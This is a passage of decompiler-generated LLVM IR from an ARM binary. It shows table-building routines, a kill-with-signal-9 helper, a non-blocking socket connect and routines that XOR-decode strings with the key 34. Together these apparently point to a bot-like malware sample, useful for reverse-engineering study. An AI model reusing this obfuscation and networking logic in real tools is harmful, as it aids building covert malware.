  %v5_112dc = or i32 %v4_112dc, %v4_112d4
  store i32 %v5_112dc, i32* %r3.global-to-local, align 4
  %v7_112e0 = icmp eq i32 %v5_112dc, 256
  store i1 %v7_112e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e0, label %dec_label_pc_112e8, label %dec_label_pc_1123c

dec_label_pc_112e8:                               ; preds = %dec_label_pc_112d4
  %v1_112e8 = add i32 %v2_11220, 8
  %v2_112e8 = inttoptr i32 %v1_112e8 to i8*
  %v3_112e8 = load i8, i8* %v2_112e8, align 1
  %v4_112e8 = zext i8 %v3_112e8 to i32
  store i32 %v4_112e8, i32* %r1.global-to-local, align 4
  %v1_112ec = add i32 %v2_11220, 9
  %v2_112ec = inttoptr i32 %v1_112ec to i8*
  %v3_112ec = load i8, i8* %v2_112ec, align 1
  %v4_112ec = zext i8 %v3_112ec to i32
  store i32 %v4_112ec, i32* %r0.global-to-local, align 4
  %v4_112f0 = mul nuw nsw i32 %v4_112ec, 256
  %v5_112f0 = or i32 %v4_112f0, %v4_112e8
  %v3_112f4 = mul i32 %v5_112f0, 65536
  store i32 %v3_112f4, i32* %r2.global-to-local, align 4
  %v3_112f8 = mul nuw nsw i32 %v4_112e8, 256
  %v5_11300 = or i32 %v4_112ec, %v3_112f8
  store i32 %v5_11300, i32* %r3.global-to-local, align 4
  %v7_11304 = icmp eq i32 %v5_11300, 4
  store i1 %v7_11304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11304, label %dec_label_pc_1130c, label %dec_label_pc_1137c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112e8
  %v2_1130c = inttoptr i32 %v1_11234 to i8*
  %v3_1130c = load i8, i8* %v2_1130c, align 1
  %v4_1130c = zext i8 %v3_1130c to i32
  store i32 %v4_1130c, i32* %r3.global-to-local, align 4
  store i32 %v2_10ee4, i32* %r2.global-to-local, align 4
  %v1_11318 = add i32 %v2_11220, 11
  %v2_11318 = inttoptr i32 %v1_11318 to i8*
  %v3_11318 = load i8, i8* %v2_11318, align 1
  %v4_11318 = zext i8 %v3_11318 to i32
  store i32 %v4_11318, i32* %r2.global-to-local, align 4
  store i32 %v2_10ee4, i32* %r3.global-to-local, align 4
  %v1_11324 = add i32 %v2_11220, 12
  %v2_11324 = inttoptr i32 %v1_11324 to i8*
  %v3_11324 = load i8, i8* %v2_11324, align 1
  %v4_11324 = zext i8 %v3_11324 to i32
  store i32 %v4_11324, i32* %r3.global-to-local, align 4
  store i32 %v2_10ee4, i32* %ip.global-to-local, align 4
  %v1_11330 = add i32 %v2_11220, 13
  %v2_11330 = inttoptr i32 %v1_11330 to i8*
  %v3_11330 = load i8, i8* %v2_11330, align 1
  %v4_11330 = zext i8 %v3_11330 to i32
  store i32 %v4_11330, i32* %r2.global-to-local, align 4
  store i32 %v4_10e64, i32* %lr.global-to-local, align 4
  %v2_1133c = load i8, i8* %tmp126, align 1
  %v3_1133c = zext i8 %v2_1133c to i32
  %v3_11340 = mul nuw nsw i32 %v3_1133c, 4
  %v1_11344 = add nuw nsw i32 %v3_11340, 4
  store i32 %v1_11344, i32* %r1.global-to-local, align 4
  %v3_11348 = load i32, i32* %v2_11348, align 4
  store i32 %v3_11348, i32* %r0.global-to-local, align 4
  %v8_1134c = inttoptr i32 %v3_11348 to i32*
  %v9_1134c = call i32* @realloc(i32* %v8_1134c, i32 %v1_11344)
  %v10_1134c = ptrtoint i32* %v9_1134c to i32
  store i32 %v10_1134c, i32* %r0.global-to-local, align 4
  store i32 %v4_10e64, i32* %r1.global-to-local, align 4
  store i32 %v2_10ee4, i32* %ip.global-to-local, align 4
  %v2_11358 = load i8, i8* %tmp126, align 1
  %v3_11358 = zext i8 %v2_11358 to i32
  store i32 %v3_11358, i32* %r2.global-to-local, align 4
  %v4_1135c = sext i8 %v3_1130c to i32
  store i32 %v4_1135c, i32* %r3.global-to-local, align 4
  store i32 %v4_10e64, i32* %lr.global-to-local, align 4
  %v1_11364 = add nuw nsw i32 %v3_11358, 1
  store i32 %v1_11364, i32* %r1.global-to-local, align 4
  %v5_11368 = mul nuw nsw i32 %v3_11358, 4
  %v6_11368 = add i32 %v5_11368, %v10_1134c
  %v7_11368 = inttoptr i32 %v6_11368 to i32*
  store i32 %v4_1135c, i32* %v7_11368, align 4
  %v1_1136c = load i32, i32* %lr.global-to-local, align 4
  %v2_1136c = add i32 %v1_1136c, 4
  %v3_1136c = inttoptr i32 %v2_1136c to i32*
  store i32 %v10_1134c, i32* %v3_1136c, align 4
  %v0_11370 = load i32, i32* %r1.global-to-local, align 4
  %v1_11370 = trunc i32 %v0_11370 to i8
  %v2_11370 = load i32, i32* %lr.global-to-local, align 4
  %v3_11370 = inttoptr i32 %v2_11370 to i8*
  store i8 %v1_11370, i8* %v3_11370, align 1
  %v0_11374 = load i32, i32* %r4.global-to-local, align 4
  %v1_11374 = add i32 %v0_11374, 9
  %v2_11374 = inttoptr i32 %v1_11374 to i8*
  %v3_11374 = load i8, i8* %v2_11374, align 1
  %v4_11374 = zext i8 %v3_11374 to i32
  store i32 %v4_11374, i32* %r0.global-to-local, align 4
  %v1_11378 = add i32 %v0_11374, 8
  %v2_11378 = inttoptr i32 %v1_11378 to i8*
  %v3_11378 = load i8, i8* %v2_11378, align 1
  %v4_11378 = zext i8 %v3_11378 to i32
  store i32 %v4_11378, i32* %r1.global-to-local, align 4
  %v0_11390.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_111b8.pre.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_112e8, %dec_label_pc_1130c
  %v0_111b8.pre.pre = phi i32 [ %v3_111c4158, %dec_label_pc_112e8 ], [ %v0_111b8.pre.pre.pre, %dec_label_pc_1130c ]
  %v0_11390 = phi i32 [ %v1_11234, %dec_label_pc_112e8 ], [ %v0_11390.pre, %dec_label_pc_1130c ]
  %v1_1137c = phi i32 [ %v4_112ec, %dec_label_pc_112e8 ], [ %v4_11374, %dec_label_pc_1130c ]
  %v0_1137c = phi i32 [ %v4_112e8, %dec_label_pc_112e8 ], [ %v4_11378, %dec_label_pc_1130c ]
  %v4_1137c = mul nuw nsw i32 %v1_1137c, 256
  %v5_1137c = or i32 %v4_1137c, %v0_1137c
  %v3_11380 = mul i32 %v5_1137c, 65536
  store i32 %v3_11380, i32* %r2.global-to-local, align 4
  %tmp138 = mul nuw nsw i32 %v0_1137c, 256
  %v5_1138c = or i32 %tmp138, %v1_1137c
  store i32 %v5_1138c, i32* %r3.global-to-local, align 4
  %v2_11390 = add i32 %v5_1138c, %v0_11390
  br label %dec_label_pc_111b8.backedge

; uselistorder directives
  uselistorder i32 %v1_1137c, { 1, 0 }
  uselistorder i32 %v3_11358, { 1, 0, 2 }
  uselistorder i32 %v10_1134c, { 1, 0, 2 }
  uselistorder i32 %v4_112ec, { 2, 1, 0, 3 }
  uselistorder i32 %v4_112e8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_112cc, { 1, 0 }
  uselistorder i32 %v3_11248, { 0, 2, 1 }
  uselistorder i32 %v1_112cc65, { 1, 0 }
  uselistorder i32 %v1_112c8, { 1, 2, 0 }
  uselistorder i32 %v2_112bc, { 1, 0 }
  uselistorder i32 %v3_111d8, { 0, 2, 1 }
  uselistorder i32 %v1_112bc50, { 1, 0 }
  uselistorder i32 %v1_112b8, { 1, 2, 0 }
  uselistorder i1 %v7_111c0, { 1, 0 }
  uselistorder i32 %v1_111b8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_11274, { 0, 2, 1 }
  uselistorder i32 %v2_11270, { 1, 2, 0 }
  uselistorder i32 %v0_112c4, { 2, 0, 1 }
  uselistorder i32 %v1_112cc, { 1, 2, 0 }
  uselistorder i32 %v3_1125028, { 1, 0 }
  uselistorder i32 %v3_1124826, { 1, 0, 2 }
  uselistorder i32 %v1_11234, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_11220, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_11204, { 0, 2, 1 }
  uselistorder i32 %v2_11200, { 1, 2, 0 }
  uselistorder i32 %v0_112b4, { 2, 0, 1 }
  uselistorder i32 %v1_112bc, { 1, 2, 0 }
  uselistorder i32 %v3_111e022, { 1, 0 }
  uselistorder i32 %v3_111d820, { 1, 0, 2 }
  uselistorder i32 %v0_11220157, { 3, 0, 1, 2 }
  uselistorder i32 %v3_111c4156, { 1, 0 }
  uselistorder i1 %v7_111c0155, { 1, 0 }
  uselistorder i32 %v1_111b8148, { 1, 0 }
  uselistorder i32 %v4_111a0, { 1, 0, 2 }
  uselistorder i32 %v0_11124, { 1, 0 }
  uselistorder i32 %v0_110fc, { 1, 0 }
  uselistorder i1 %v7_110b0, { 1, 0 }
  uselistorder i32 %v13_110ac, { 1, 0, 2 }
  uselistorder i32 %v0_110a0, { 0, 2, 1 }
  uselistorder i32 %v1_11070, { 1, 0 }
  uselistorder i32 %v3_1105c, { 1, 0 }
  uselistorder i32 %v0_11054, { 1, 0 }
  uselistorder i32 %v1_11048, { 1, 2, 0 }
  uselistorder i1 %v7_11014, { 1, 0 }
  uselistorder i32 %v5_11010, { 1, 0, 2 }
  uselistorder i1 %v7_10ff8, { 1, 0 }
  uselistorder i32 %v3_10ff4, { 1, 0, 2 }
  uselistorder i1 %v7_10fdc, { 1, 0 }
  uselistorder i32 %v3_10fd8, { 2, 1, 0, 3 }
  uselistorder i1 %v7_10fc0, { 2, 1, 0 }
  uselistorder i32 %v1_10fc4, { 1, 0 }
  uselistorder i32 %v1_11164, { 1, 2, 0 }
  uselistorder i32 %v2_11060, { 1, 0, 2 }
  uselistorder i32 %v2_10f84, { 4, 3, 2, 5, 7, 9, 1, 0, 6, 8, 10 }
  uselistorder i32 %v4_10f38, { 3, 0, 2, 1 }
  uselistorder i32 %v2_10f2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10f04, { 1, 0, 2 }
  uselistorder i32 %v0_10ec0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10ebc, { 1, 0, 2 }
  uselistorder i32 %v1_10eb8, { 1, 0 }
  uselistorder i32 %v2_10eac12, { 1, 0 }
  uselistorder i32 %v2_10eac, { 1, 0 }
  uselistorder i1 %v8_10e9c, { 1, 0 }
  uselistorder i32 %v2_10e84, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10e6c, { 1, 0 }
  uselistorder i32 %v4_10e64, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i8* %stack_var_-4288, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 7, 0, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 15, 16, 12, 17, 19, 18, 20 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 31, 9, 10, 30, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 26, 27, 29 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 27, 9, 10, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 28, 23, 29, 25 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 7, 48, 8, 9, 10, 13, 12, 16, 15, 14, 18, 17, 21, 19, 20, 22, 23, 25, 24, 27, 26, 28, 30, 29, 31, 38, 33, 32, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 34, 9, 10, 11, 12, 33, 36, 15, 16, 17, 18, 19, 20, 21, 22, 23, 35, 24, 25, 26, 27, 32, 30, 28, 29, 31, 37 }
  uselistorder void (i32*)* @free, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 5, 0, 1, 6, 10, 11, 8, 9, 3, 4, 7, 2, 12 }
  uselistorder i32 53, { 1, 0, 2 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder label %dec_label_pc_1137c, { 1, 0 }
  uselistorder label %dec_label_pc_11248.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_111d8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_111b8.backedge, { 1, 0 }
  uselistorder label %bb135, { 1, 0 }
  uselistorder label %dec_label_pc_11258, { 1, 0 }
  uselistorder label %dec_label_pc_11258.preheader, { 1, 0 }
  uselistorder label %bb133, { 1, 0 }
  uselistorder label %dec_label_pc_111e8, { 1, 0 }
  uselistorder label %dec_label_pc_111e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_111cc, { 1, 0 }
  uselistorder label %dec_label_pc_11144, { 1, 0 }
  uselistorder label %dec_label_pc_1112c, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1110c, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_11044.dec_label_pc_11044_crit_edge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %.thread13, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e94, { 1, 0 }
}

define i32 @function_11398(i32 %arg1) local_unnamed_addr {
dec_label_pc_11398:
  %v2_1139c = load i32, i32* @global_var_1cd6c.237, align 4
  %v2_113a4 = call i32 @kill(i32 %v2_1139c, i32 9)
  %v0_113a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113a8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11398
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11398, %bb
  ret i32 %v2_113a4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 15, 13, 6, 5, 12, 11, 14, 1, 0, 10, 4, 3, 9, 8, 7, 2, 16 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_113ac() local_unnamed_addr {
dec_label_pc_113ac:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_113ac = load i32, i32* @r4, align 4
  store i32 %v3_113ac, i32* %stack_var_-16, align 4
  %v0_113b0 = load i32, i32* @r0, align 4
  store i32 %v0_113b0, i32* %r5.global-to-local, align 4
  %v1_113b4 = add i32 %v0_113b0, 4
  %v2_113b4 = inttoptr i32 %v1_113b4 to i32*
  %v3_113b4 = load i32, i32* %v2_113b4, align 4
  store i32 %v3_113b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_113d4 = icmp ne i32 %v3_113b4, -1
  call void @__pseudo_cond_branch(i1 %v1_113d4, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_113e4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_113e4, i32* %r3.global-to-local, align 4
  %v7_113ec = icmp eq i32 %v3_113e4, -1
  %v0_113f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_113f4 = add i32 %v0_113f4, 28
  store i32 %v1_113f4, i32* %r0.global-to-local, align 4
  %v2_113f8 = add i32 %v0_113f4, 4
  %v3_113f8 = inttoptr i32 %v2_113f8 to i32*
  store i32 %v3_113e4, i32* %v3_113f8, align 4
  br i1 %v7_113ec, label %dec_label_pc_113ac.dec_label_pc_11474_crit_edge, label %dec_label_pc_11400

dec_label_pc_113ac.dec_label_pc_11474_crit_edge:  ; preds = %dec_label_pc_113ac
  %v14_11478.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11474

dec_label_pc_11400:                               ; preds = %dec_label_pc_113ac
  %v2_113b8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_11400 = load i32, i32* %r6.global-to-local, align 4
  %v1_11400 = load i32, i32* %r5.global-to-local, align 4
  %v2_11400 = add i32 %v1_11400, 24
  %v3_11400 = inttoptr i32 %v2_11400 to i32*
  store i32 %v0_11400, i32* %v3_11400, align 4
  %v0_11404 = load i32, i32* %r0.global-to-local, align 4
  %v2_11404 = call i32 @function_13a3c(i32 %v0_11404, i32 256)
  store i32 %v2_11404, i32* %r0.global-to-local, align 4
  %v0_11408 = load i32, i32* %r5.global-to-local, align 4
  %v1_11408 = add i32 %v0_11408, 4
  %v2_11408 = inttoptr i32 %v1_11408 to i32*
  %v3_11408 = load i32, i32* %v2_11408, align 4
  store i32 %v3_11408, i32* %r0.global-to-local, align 4
  %v2_11418 = call i32 (i32, i32, ...) @fcntl(i32 %v3_11408, i32 3)
  store i32 %v3_11408, i32* %r0.global-to-local, align 4
  %v2_11428 = call i32 (i32, i32, ...) @fcntl(i32 %v3_11408, i32 4)
  store i32 %v2_11428, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %r3.global-to-local, align 4
  %v0_11430 = load i32, i32* %r5.global-to-local, align 4
  %v2_11434 = load i32, i32* @global_var_1cd44.239, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_11440 = add i32 %v0_11430, 8
  %v3_11440 = inttoptr i32 %v2_11440 to i32*
  store i32 %v2_11434, i32* %v3_11440, align 4
  %v0_11444 = load i32, i32* %r3.global-to-local, align 4
  %v1_11444 = load i32, i32* %r5.global-to-local, align 4
  %v2_11444 = add i32 %v1_11444, 12
  %v3_11444 = inttoptr i32 %v2_11444 to i32*
  store i32 %v0_11444, i32* %v3_11444, align 4
  %v0_1144c = load i32, i32* %r5.global-to-local, align 4
  %v1_1144c = add i32 %v0_1144c, 4
  %v2_1144c = inttoptr i32 %v1_1144c to i32*
  %v3_1144c = load i32, i32* %v2_1144c, align 4
  store i32 %v3_1144c, i32* %r0.global-to-local, align 4
  %v0_11450 = load i32, i32* %r3.global-to-local, align 4
  %v2_11450 = mul i32 %v0_11450, 2
  store i32 %v2_11450, i32* %r3.global-to-local, align 4
  store i32 %v2_11450, i32* %stack_var_-32, align 4
  %v3_11470 = call i32 @_connect(i32 %v3_1144c, i32 %v2_113b8, i32 16)
  store i32 %v3_11470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %dec_label_pc_113ac.dec_label_pc_11474_crit_edge, %dec_label_pc_11400
  %v14_11478 = phi i32 [ %v14_11478.pre, %dec_label_pc_113ac.dec_label_pc_11474_crit_edge ], [ %v3_11470, %dec_label_pc_11400 ]
  %v2_11478 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11478, i32* @r4, align 4
  ret i32 %v14_11478

; uselistorder directives
  uselistorder i32 %v2_11450, { 1, 0 }
  uselistorder i32 %v3_11408, { 1, 0, 2, 3 }
  uselistorder i32 %v3_113e4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 6, 5, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_13a3c, { 7, 12, 16, 15, 14, 13, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 5, 2, 3, 4, 0, 1, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_11474, { 1, 0 }
}

define i32 @function_11480(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11480:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1cd10.241 to i32), i32* %r8.global-to-local, align 4
  %v2_11488 = load i32, i32* @global_var_1cd10.241, align 4
  store i32 ptrtoint (i32* @global_var_1cd3c.243 to i32), i32* %sb.global-to-local, align 4
  %v3_11494 = mul i32 %v2_11488, 16
  store i32 %v3_11494, i32* %r3.global-to-local, align 4
  %v3_1149c = urem i32 %arg3, 65536
  store i32 %v3_1149c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_114a8 = load i32, i32* @global_var_1cd3c.243, align 4
  %v1_114ac = add i32 %v3_11494, 16
  store i32 %v1_114ac, i32* %r1.global-to-local, align 4
  store i32 %v3_1149c, i32* %stack_var_-44, align 4
  %v8_114b4 = inttoptr i32 %v2_114a8 to i32*
  %v9_114b4 = call i32* @realloc(i32* %v8_114b4, i32 %v1_114ac)
  %v11_114b4 = ptrtoint i32* %v9_114b4 to i32
  store i32 %v11_114b4, i32* %sl.global-to-local, align 4
  %v0_114bc = load i32, i32* %r5.global-to-local, align 4
  %v1_114c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_114c0 = inttoptr i32 %v1_114c0 to i32*
  store i32 %v11_114b4, i32* %v2_114c0, align 4
  %v2_114c4 = load i32, i32* @global_var_1cd10.241, align 4
  store i32 %v2_114c4, i32* %fp.global-to-local, align 4
  %v1_114c8 = inttoptr i32 %v0_114bc to i8*
  %v2_114c8 = call i32 @function_1399c(i8* %v1_114c8)
  %sext = mul i32 %v2_114c8, 16777216
  %v1_114cc = sdiv i32 %sext, 16777216
  %v2_114cc = add nsw i32 %v1_114cc, 1
  store i32 %v1_114cc, i32* %r7.global-to-local, align 4
  %v1_114d8 = call i32* @malloc(i32 %v2_114cc)
  %v3_114d8 = ptrtoint i32* %v1_114d8 to i32
  %v0_114dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_114dc, i32* %r1.global-to-local, align 4
  store i32 %v2_114cc, i32* %r2.global-to-local, align 4
  store i32 %v3_114d8, i32* %r6.global-to-local, align 4
  %v3_114e8 = call i32 @function_13a18(i32 %v3_114d8, i32 %v0_114dc, i32 %v2_114cc)
  %v0_114ec = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_114ec, 1
  %extract.t6 = trunc i32 %v0_114ec to i8
  br i1 %tmp21, label %dec_label_pc_11510, label %dec_label_pc_114f4

dec_label_pc_114f4:                               ; preds = %dec_label_pc_11480
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114f8

dec_label_pc_114f8:                               ; preds = %dec_label_pc_114f8, %dec_label_pc_114f4
  %v2_11500 = phi i32 [ %v1_11504, %dec_label_pc_114f8 ], [ 0, %dec_label_pc_114f4 ]
  %v1_114f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_114f8 = add i32 %v1_114f8, %v2_11500
  %v3_114f8 = inttoptr i32 %v2_114f8 to i8*
  %v4_114f8 = load i8, i8* %v3_114f8, align 1
  %v6_114f8 = zext i8 %v4_114f8 to i32
  %v1_114fc = xor i32 %v6_114f8, 34
  store i32 %v1_114fc, i32* %r3.global-to-local, align 4
  %v1_11500 = trunc i32 %v1_114fc to i8
  store i8 %v1_11500, i8* %v3_114f8, align 1
  %v0_11504 = load i32, i32* %r2.global-to-local, align 4
  %v1_11504 = add i32 %v0_11504, 1
  store i32 %v1_11504, i32* %r2.global-to-local, align 4
  %v0_11508 = load i32, i32* %r7.global-to-local, align 4
  %v9_11508 = icmp eq i32 %v0_11508, %v1_11504
  br i1 %v9_11508, label %dec_label_pc_11510.loopexit, label %dec_label_pc_114f8

dec_label_pc_11510.loopexit:                      ; preds = %dec_label_pc_114f8
  %extract.t = trunc i32 %v1_11504 to i8
  br label %dec_label_pc_11510

dec_label_pc_11510:                               ; preds = %dec_label_pc_11510.loopexit, %dec_label_pc_11480
  %v0_11520.off0 = phi i8 [ %extract.t, %dec_label_pc_11510.loopexit ], [ %extract.t6, %dec_label_pc_11480 ]
  %v2_11510 = load i32, i32* @global_var_1cd10.241, align 4
  %v2_11514 = load i32, i32* @global_var_1cd3c.243, align 4
  store i32 %v2_11514, i32* %r2.global-to-local, align 4
  %v3_11518 = mul i32 %v2_11510, 16
  %v2_1151c = add i32 %v2_11514, %v3_11518
  store i32 %v2_1151c, i32* %r3.global-to-local, align 4
  %v3_11520 = add i32 %v2_1151c, 12
  %v4_11520 = inttoptr i32 %v3_11520 to i8*
  store i8 %v0_11520.off0, i8* %v4_11520, align 1
  %v0_11524 = load i32, i32* %r6.global-to-local, align 4
  %v1_11524 = load i32, i32* %sl.global-to-local, align 4
  %v2_11524 = load i32, i32* %fp.global-to-local, align 4
  %v5_11524 = mul i32 %v2_11524, 16
  %v6_11524 = add i32 %v5_11524, %v1_11524
  %v7_11524 = inttoptr i32 %v6_11524 to i32*
  store i32 %v0_11524, i32* %v7_11524, align 4
  %v2_1152c = load i32, i32* @global_var_1cd10.241, align 4
  store i32 %v2_1152c, i32* %r7.global-to-local, align 4
  %v2_11530 = load i32, i32* @global_var_1cd3c.243, align 4
  store i32 %v2_11530, i32* %sl.global-to-local, align 4
  %v1_11534 = inttoptr i32 %arg2 to i8*
  %v2_11534 = call i32 @function_1399c(i8* %v1_11534)
  %sext1 = mul i32 %v2_11534, 16777216
  %v1_11538 = sdiv i32 %sext1, 16777216
  %v2_11538 = add nsw i32 %v1_11538, 1
  store i32 %v1_11538, i32* %r5.global-to-local, align 4
  %v1_11544 = call i32* @malloc(i32 %v2_11538)
  %v3_11544 = ptrtoint i32* %v1_11544 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_11538, i32* %r2.global-to-local, align 4
  store i32 %v3_11544, i32* %r6.global-to-local, align 4
  %v3_11554 = call i32 @function_13a18(i32 %v3_11544, i32 %arg2, i32 %v2_11538)
  %v0_11558 = load i32, i32* %r5.global-to-local, align 4
  %tmp22 = icmp slt i32 %v0_11558, 1
  %extract.t8 = trunc i32 %v0_11558 to i8
  br i1 %tmp22, label %dec_label_pc_1157c, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_11510
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_11564, %dec_label_pc_11560
  %v2_1156c = phi i32 [ %v1_11570, %dec_label_pc_11564 ], [ 0, %dec_label_pc_11560 ]
  %v1_11564 = load i32, i32* %r6.global-to-local, align 4
  %v2_11564 = add i32 %v1_11564, %v2_1156c
  %v3_11564 = inttoptr i32 %v2_11564 to i8*
  %v4_11564 = load i8, i8* %v3_11564, align 1
  %v6_11564 = zext i8 %v4_11564 to i32
  %v1_11568 = xor i32 %v6_11564, 34
  store i32 %v1_11568, i32* %r3.global-to-local, align 4
  %v1_1156c = trunc i32 %v1_11568 to i8
  store i8 %v1_1156c, i8* %v3_11564, align 1
  %v0_11570 = load i32, i32* %r2.global-to-local, align 4
  %v1_11570 = add i32 %v0_11570, 1
  store i32 %v1_11570, i32* %r2.global-to-local, align 4
  %v0_11574 = load i32, i32* %r5.global-to-local, align 4
  %v9_11574 = icmp eq i32 %v0_11574, %v1_11570
  br i1 %v9_11574, label %dec_label_pc_1157c.loopexit, label %dec_label_pc_11564

dec_label_pc_1157c.loopexit:                      ; preds = %dec_label_pc_11564
  %extract.t7 = trunc i32 %v1_11570 to i8
  br label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_1157c.loopexit, %dec_label_pc_11510
  %v0_1158c.off0 = phi i8 [ %extract.t7, %dec_label_pc_1157c.loopexit ], [ %extract.t8, %dec_label_pc_11510 ]
  %v2_1157c = load i32, i32* @global_var_1cd10.241, align 4
  %v2_11580 = load i32, i32* @global_var_1cd3c.243, align 4
  %v3_11584 = mul i32 %v2_1157c, 16
  %v2_11588 = or i32 %v3_11584, 13
  %v3_1158c = add i32 %v2_11588, %v2_11580
  %v4_1158c = inttoptr i32 %v3_1158c to i8*
  store i8 %v0_1158c.off0, i8* %v4_1158c, align 1
  %v2_11594 = load i32, i32* @global_var_1cd10.241, align 4
  store i32 %v2_11594, i32* %lr.global-to-local, align 4
  %v4_11598 = load i8, i8* @global_var_1cd41.246, align 1
  %v5_11598 = zext i8 %v4_11598 to i32
  %v3_1159c = load i8, i8* bitcast (i8** @global_var_1cd40.245 to i8*), align 4
